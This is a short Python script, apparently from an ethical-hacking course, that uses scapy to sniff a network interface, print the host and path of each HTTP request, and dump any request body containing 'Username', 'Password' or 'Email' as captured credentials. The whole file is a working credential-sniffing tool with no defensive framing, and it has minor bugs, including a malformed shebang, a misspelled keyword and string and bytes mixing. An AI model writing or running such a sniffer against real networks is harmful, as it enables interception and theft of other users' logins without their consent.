#!usr/bin/env python

#Import Modules
import scapy.all as scapy
import argparse
from scapy.layers import http

#Function to retrieve interface to sniff (User input)
def target_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface to sniff")
    arguments = parser.parse_args()
    return arguments.interface


def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["Username", "Password", "Passsword2", "Email"]
            for key in keys:
                if key in load:
                    print("[+] Potential User Credentials >> " + load)
                    break


iface = target_interface()
sniff(iface)
